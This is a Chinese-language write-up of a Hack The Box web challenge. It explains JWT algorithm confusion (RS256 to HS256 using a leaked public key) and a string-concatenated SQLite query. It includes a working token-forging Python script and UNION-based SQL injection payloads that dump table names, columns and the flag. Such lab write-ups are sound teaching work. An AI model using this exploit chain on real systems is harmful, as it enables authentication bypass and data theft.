---
title: Under Construction
date: 2026-06-12
tags: HTB, Web
---

# Under Construction

![[file-20260605203754464.png]]

## 一、Web Walk

题目给了一个网址：

```
http://154.57.164.82:32728
```

尝试访问：

```bash
$curl -I http://154.57.164.82:32728
HTTP/1.1 302 Found
X-Powered-By: Express
Location: /auth
Vary: Accept
Content-Type: text/plain; charset=utf-8
Content-Length: 27
Date: Fri, 05 Jun 2026 12:47:49 GMT
Connection: keep-alive
```

会将我们重定向到 `/auth` 目录。

跟随重定向：

```bash
 $curl -L http://154.57.164.82:32728
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Under Construction - Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <style>
        .loginForm {
            min-width: 500px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="row">
            <form class="loginForm" method="post">

                <div class="form-group">
                  <label for="username">Username</label>
                  <input class="form-control input-lg" type="text" name="username" placeholder="username" />
                </div>
                <div class="form-group">
                  <label for="password">Password</label>
                  <input class="form-control input-lg" type="password" name="password" placeholder="password" />
                </div>
                <div class="form-group">
                    <div class="btn-group" style="width: 100%;">
                        <input type="submit" name="login" class="btn btn-success" value="Login" />
                        <input type="submit" name="register" class="btn btn-primary" value="Register" />
                    </div>
                </div>
              </form>
        </div>
      </div>
</body>
<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
```

是一个登入界面：

![[file-20260605204346367.png]]

具有登入和注册两种功能。

尝试直接登入：

```
username:admin
password:admin
```

页面会报错：

```
Invalid username or password
```

在 Burp 中可以看到，我们向 `/auth` 发送 POST 请求，请求正文就是我们输入的账密：

![[file-20260605205321529.png]]

HTTP 响应码为 302，将我们重定向到了：

```
/auth?error=Invalid%20username%20or%20password
```

通过 GET 方式向 error 参数提交内容。这段内容就是我们在页面上看到的那段报错。

既然内容能输出在页面上，那么尝试给 `error` 传 HTML 代码，验证是否存在 XSS：

```
/auth?error=<b>Hello</b>
```

![[file-20260605205719803.png]]

如果存在，"Hello" 应该变成粗体，但从结果看并没有。而且从页面源码看，这采取的防护措施是 HTML 实体编码：

![[file-20260605210131479.png]]

尝试注册一个用户：

```
username:admin
password:admin
```

![[file-20260605210713361.png]]

提示注册成功，而且似乎用的还是老一套，用 `/auth` 接收 POST 传值，并且用 `/auth?error=……` 展现提示内容。

> 补充：到这，我想到了 Timing Attack（当然我觉得和本题关系不大，但是当时确实想到了，可以作为思路上的拓展）。简单来说，如果后端处理正确用户和不正确用户采用的不同的处理逻辑，那么反馈给我的响应时间就会不同。如此一来，即使登入报错信息都是同一个，也可能枚举出数据库中的合法用户。当然，经过尝试后，发现差异很小，不存在这个问题，而且目前来看枚举用户的作用不大。

登入：

![[file-20260605212248967.png]]

可以看到一个面板，上面有着开发者留下的提示：

```
Welcome admin
This site is under development.
Please come back later.
```

说当前正在开发中，让我们以后再来。

在 Burp 中，我的 JWT 插件（JWT Editor）将请求标记成了绿色，这意味着请求或者响应中，出现了 JWT：

![[file-20260605212539483.png]]

当然，直接通过插件或者在线解码网站就可以解码 JWT 看到其中的 Header 与 Payload，但是自己写脚本往往能有更多的收获：

```python
import base64, json

token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWVxua3RzYmoxS3h4VU9vencwdHJQOTNCZ0lwWHY2V2lwUVJCNWxxb2ZQbFU2RkI5OUpjNVFaMDQ1OXQ3M2dnVkRRaVxuWHVDTUkyaG9VZkoxVm1qTmVXQ3JTckRVaG9rSUZaRXVDdW1laHd3dFVOdUV2MGV6QzU0WlRkRUM1WVNUQU96Z1xuaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSFxuK0Z5bk5zak5Od281blJlN3RSMTJXYjJZT0N4dzJ2ZGFtTzFuMWtmL1NNeXBTS0t2T2dqNXkwTEdpVTNqZVhNeFxuVjhXUytZaVlDVTVPQkFtVGN6Mncya3pCaFpGbEg2Uks0bXF1ZXhKSHJhMjNJR3Y1VUo1R1ZQRVhwZENxSzNUclxuMHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLVxuIiwiaWF0IjoxNzgwNjY1NzIwfQ.8tv3C6vxW8QEVANzjsc7uRuMGwJDZd4JDmNMs0anayX1sFgIQ4GYWV24arN7K2SN468EjrQq_OzHIfNc7fUpPnj_6wcvcQJP4B5W_txRrrV2hxtuNWKBr2Q3pocxxydKcIz2-vvxwz3ZnK_KMkkFCQEDIiGQ_iBS3y9iPbR2z3luspaAyg8uZFjp7Y0POW76XXBTqjWTMqv3FiPDSOKa_a_cs1eGWBplYRWAfhXhLJXpex98Kbczi5RQeGL36HuOZWbRS6ikVJJxP5U_7h-baJuovhu7LTAS56I48aMZIm46ftpajY7DAG4ffOz91YrG9xUpPUEf3EXErYYBUJA0SQ'

header, payload, signature = token.split('.')

def decode(seg):
	seg += '=' * (-len(seg) % 4)
	return json.loads(base64.urlsafe_b64decode(seg))

print(json.dumps(decode(header)))
print(json.dumps(decode(payload)))
```

> 注意：JWT 中用的 base64 编码是 base64url 编码，末尾的“等号”通常会被省略。

运行脚本，输出的结果：

```json
$ python decode.py | jq
{
  "alg": "RS256",
  "typ": "JWT"
}
{
  "username": "admin",
  "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
  "iat": 1780665720
}
```

Header 中的 `alg` 指明了 JWT 签名算法为 RS256，并且在 Payload 中的 `pk` 暴露了 RSA 的公钥信息。

## 二、算法混淆攻击

公钥暴露 + JWT，这会让人想到 JWT 中的算法混淆攻击，既然本题给了源码，可以直接查找对应的部分。

深入源码前，先铺垫一下“什么 JWT 算法混淆攻击”。

我们常说的 JWT 其实是 JWS（签名形 JWT），其有三部分组成：

```
base64url(Header).base64url(Payload).base64url(Signature)
```

其中的 Signature 部分是对 Header 和 Payload 的签名，用于身份验证。

签名算法有两大类：对称加密、非对称加密

JWT 算法混淆攻击有两个前提：

- 服务器端支持多类型的签名算法，服务器端信任用户提供的算法选择信息
- 不同类型的签名算法的密钥有混用现象

先说第一个前提。这通常源于 JWT 库的不正当实现，很多的 JWT 库支持根据 JWT 中的 Header 中的 `alg` 字段来选择签名算法。而 JWS 中，JWT 中的信息是谁都能获取的（因为只是 base 编码，可逆），里面的 Header 的信息用户看得到，也可以修改。服务器端若没有强制指定算法的话，签名算法就会被用户传过来的信息所改变。

但一切正常的情况下，即使用户对 JWT 进行修改，服务器也会拒绝，因为签名对不上，用户无法伪造签名用的密钥。

这就引出了第二个前提。这通常由程序员的对代码库的不正当假设造成的。很多代码库提供的接口都具备很好的可读性，即通过英文单词以及对协议/功能的理解立马可以知道“大致意思”，这就使得有些程序员过度自信/假设，不看接口文档或看源码就直接上手使用。

看一个例子，假设 JWT 库实现了下述 API（伪代码）：

```javascript
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();   // 上一条讲的：用户可控验签算法选择

    if(algorithm == "RS256"){
        // 把 secretOrPublicKey 当作 RSA 公钥
        // 用公钥做非对称验签:验证签名是否由对应的"私钥"产生
        expectedSig = RSA_SHA256_verify(
            data      = token.header + "." + token.payload,
            signature = token.signature,
            publicKey = secretOrPublicKey      // 作为 RSA 的公钥
        );
        return expectedSig;   // 攻击者没有私钥,无法伪造 → 安全

    } else if (algorithm == "HS256"){
        // 把 secretOrPublicKey 当作 HMAC 的密钥(secret)
        // 用这个 secret 重新算一遍 HMAC,再和 token 里的签名比对
        expectedSig = HMAC_SHA256(
            data = token.header + "." + token.payload,
            key  = secretOrPublicKey      // 这里被当成了对称加密中的"机密密钥"
        );
        return expectedSig == token.signature;
    }
}
```

程序员看到：

```js
verify(token, secretOrPublicKey)
```

想：我如果要实现 RSA 签名验证，只需要调用这个 API 接口，然后提供 JWT 和 对应的公钥信息就可以了。

程序员不知道的是，他提供的公钥同时也作为了对称加密的私钥存在，并且接口实现多算法兼容，而程序员想的只是自己的非对称加密。

那么一旦算法被用户换成了对称加密，并且用非对称加密的公钥做了签名，服务器信任用户算法，将验签算法同步为对称加密，密钥就是非对称加密的公钥。结果就是，JWT 验签通过，JWT 合法。

这就是算法混淆攻击，混淆的就是对称加密和非对称加密这两个算法。

知道原理后，我们回到题目。

将压缩包下载后解压到 `src` 目录：

```bash
$ 7z x -osrc challenge.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 6010 bytes (6 KiB)

Extracting archive: challenge.zip
--
Path = challenge.zip
Type = zip
Physical Size = 6010

Everything is Ok

Folders: 4
Files: 8
Size:       9945
Compressed: 6010
```

通过 `rg` 或者 `grep` 进行查找：

```bash
$ rg public src/
src/helpers/JWTHelper.js
5:const publicKey  = fs.readFileSync('./public.key', 'utf8');
9:        data = Object.assign(data, {pk:publicKey});
13:        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
```

看到验证签名的操作中赫然放着两个算法，而且一个是对称加密算法（HS256）另一个是非对称加密算法（RS256）。

而且，其中验签的密钥共用了 `publicKey` 即非对称加密的公钥。

算法混淆攻击成立的第一个要素就有了。现在找另外一个，即“后端信任客户端指定的算法”，打开对应文件去看看：

```js
const fs = require('fs');
const jwt = require('jsonwebtoken');

const privateKey = fs.readFileSync('./private.key', 'utf8');
const publicKey  = fs.readFileSync('./public.key', 'utf8');

module.exports = {
    async sign(data) {
        data = Object.assign(data, {pk:publicKey});
        return (await jwt.sign(data, privateKey, { algorithm:'RS256' }))
    },
    async decode(token) {
        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
    }
}
```

使用了 jsonwebtoken 库，且我们能找到对应的版本：

```bash
$ rg jsonwebtoken src/
src/package.json
15:    "jsonwebtoken": "^8.5.1",

src/helpers/JWTHelper.js
```

去官网上找到对应版本，看里面的 `verify.js` 文件，其中有：

```js
if (!~options.algorithms.indexOf(decodedToken.header.alg)) {
  return done(new JsonWebTokenError('invalid algorithm'));
}

try {
  valid = jws.verify(jwtString, decodedToken.header.alg, secretOrPublicKey);
} catch (e) {
  return done(e);
}
```

可以看到，用户传来的 JWT 中的 Header 中的 `alg` 会作为算法判断依据，而且这里只是做了“是否在指定算法中选择”这一判断。

因此，用户可以自行修改 `alg` 成允许的算法，来控制后端的验签算法。算法混淆攻击的第二个要素也找到了。

在该库的新版本中，添加了：

```js
if (header.alg.startsWith('HS') && secretOrPublicKey.type !== 'secret') {
      return done(new JsonWebTokenError((`secretOrPublicKey must be a symmetric key when using ${header.alg}`)))
    } else if (/^(?:RS|PS|ES)/.test(header.alg) && secretOrPublicKey.type !== 'public') {
      return done(new JsonWebTokenError((`secretOrPublicKey must be an asymmetric key when using ${header.alg}`)))
    }

if (!options.allowInvalidAsymmetricKeyTypes) {
  try {
	validateAsymmetricKey(header.alg, secretOrPublicKey);
  } catch (e) {
	return done(e);
  }
}
```

这验证了算法和密钥是否匹配，以此来限制 JWT 算法混淆攻击。但最有效的做法还是后端固定算法，不信任用户传入数据。

综上，我们已经确认了存在算法混淆攻击，但是用途是什么呢？

## 三、SQL 注入

JWT 中，有用户的信息，可能会涉及到数据库的操作，搜索一下：

```bash
$ rg sql src/
src/package.json
17:    "sqlite3": "^4.1.1"

src/helpers/DBHelper.js
1:const sqlite = require('sqlite3');
3:const db = new sqlite.Database('./database.db', err => {
$ rg SELECT src/
src/helpers/DBHelper.js
11:            db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
19:            db.get(`SELECT * FROM users WHERE username = ?`, username, (err, data) => {
33:            db.get(`SELECT * FROM users WHERE username = ? AND password = ?`, username, password, (err, data) => {
```

首先，确认了服务器采用的是 SQLite 数据库，版本号为 4.1.1。并且在查找相关语法的时候，看到了：

```sql
SELECT * FROM users WHERE username = '${username}'
```

这是明显的“拼接”行为，换言之，存在 SQL 注入的风险。查看对应文件的源码（截取了部分）：

```js
const sqlite = require('sqlite3');

module.exports = {
    getUser(username){
        return new Promise((res, rej) => {
            db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
                if (err) return rej(err);
                res(data);
            });
        });
    },
}
```

之前看到的有 SQL 注入风险的语句是在 `getUser()` 函数中的，查看哪里调用了该函数：

```bash
$ rg 'getUser' src/
src/routes/index.js
10:        let user = await DBHelper.getUser(req.data.username);

src/helpers/DBHelper.js
9:    getUser(username){
```

在 `src/routes/index.js` 文件（截取了部分）：

```js
const express = require('express');
const router = express.Router();
const path = require('path');
const AuthMiddleware = require('../middleware/AuthMiddleware');
const JWTHelper = require('../helpers/JWTHelper');
const DBHelper = require('../helpers/DBHelper');

router.get('/', AuthMiddleware, async (req, res, next) => {
    try{
        let user = await DBHelper.getUser(req.data.username);
        if (user === undefined) {
            return res.send(`user ${req.data.username} doesn't exist in our database.`);
        }
        return res.render('index.html', { user });
    }catch (err){
        return next(err);
    }
});

module.exports = router;
```

GET 访问根目录，经过中间件 `AuthMiddleware`，其定义：

```js
const JWTHelper = require('../helpers/JWTHelper');

module.exports = async (req, res, next) => {
    try{
        if (req.cookies.session === undefined) return res.redirect('/auth');
        let data = await JWTHelper.decode(req.cookies.session);
        req.data = {
            username: data.username
        }
        next();
    } catch(e) {
        console.log(e);
        return res.status(500).send('Internal server error');
    }
}
```

`getUser()` 的参数 `req.data.username` 就是从 JWT 的 Payload 中提取出来的 `username`。

而且，数据库查询完成后的返回结果会渲染到模板文件中：

```js
return res.render('index.html', { user });
```

也就是之前我们看到的有开发者提示的主界面：

```html
Welcome {{ user.username }}<br>
This site is under development. <br>
Please come back later.
```

数据库查询结果返回给 user 变量，然后取出其中的 username 字段的值，渲染到模板中。

现在攻击链很清楚了，就是通过算法混淆攻击伪造合法的 JWT，其中 JWT 中的 Payload 中的 username 字段指定成 SQL 注入语法。

## 四、利用

写一个脚本：

```python
import jwt
import requests

public_key = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n'

token = jwt.encode({'username':"admin"}, public_key, 'HS256')

res = requests.get('http://154.57.164.79:30244',cookies={'session':token.decode()})

print(res.text)
```

由于我们之前注册了 admin 用户，因此运行脚本后，"Welcome" 后渲染的就是查询到的用户：

```bash
$ python exploit.py | rg -o 'Welcome \w+'
Welcome admin
```

尝试测试闭合：

```
admin'
```

```bash
$ python exploit.py
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: SQLITE_ERROR: unrecognized token: &quot;&#39;admin&#39;&#39;&quot;</pre>
</body>
</html>
```

可以发现报了 SQL 语法错误：

```
Error: SQLITE_ERROR: unrecognized token: "'admin''"
```

看来：

- 闭合对了
- 也确认了 SQL 注入漏洞

添加注释（SQLite 中采用 `--`）使得 SQL 语句正确：

```
admin'--
```

```bash
$ python exploit.py | rg -o 'Welcome \w+'
Welcome admin
```

恢复正常。

由于处于 SELECT 语句中，并且有回显，可以先考虑一下 UNION SELECT。

先通过 NULL 占位，不断枚举 NULL 的数目来判断出查询结果的列数目，最终在枚举到 3 个 NULL 的时候，响应恢复正常：

```
admin' union select NULL,NULL,NULL--
```

看来，查询的结果共有三列。从模板中可以看到，虽然返回结果有三列，但是它只是渲染了其中一列的数据：

```
{{ user.username }}
```

因此，我们需要逐个判断“哪个位置才是显示位”：

```
admin' union select 1,NULL,NULL--
admin' union select NULL,1,NULL--
admin' union select NULL,NULL,1--
```

经过测试，第二个位置（`NULL,1,NULL`）是显示位：

```bash
$ python exploit.py | rg -o 'Welcome \d'
Welcome 1
```

查询所有表：

```bash
admin' union select NULL,group_concat(tbl_name,'-'),NULL from sqlite_master where type = 'table'--"
```

```bash
$ python exploit.py | rg -o 'Welcome [A-Za-z_-]+' | sed 's/Welcome //'
flag_storage-sqlite_sequence-users
```

三张表：

- flag_storage
- sqlite_sequence
- users

我们的目标是 flag，因此第一张表的优先级最高，查看该表中的字段有哪些：

```
admin' union select NULL, group_concat(name,'^') as column_names,NULL from pragma_table_info('flag_storage')--
```

```bash
$ python exploit.py | rg -o 'Welcome [A-Za-z_^-]+' | sed 's/Welcome //'
id^top_secret_flaag
```

两个字段：

- id
- top_secret_flaag

看来第二个字段很可能就是我们要找的 Flag 了。

```
admin' union select NULL, top_secret_flaag,NULL from flag_storage--
```

```bash
$ python exploit.py | rg -o 'Welcome [A-Za-z0-9_-{}]+' | sed 's/Welcome //'
HTB{d0***********************k3y}
```

成功得到 Flag。
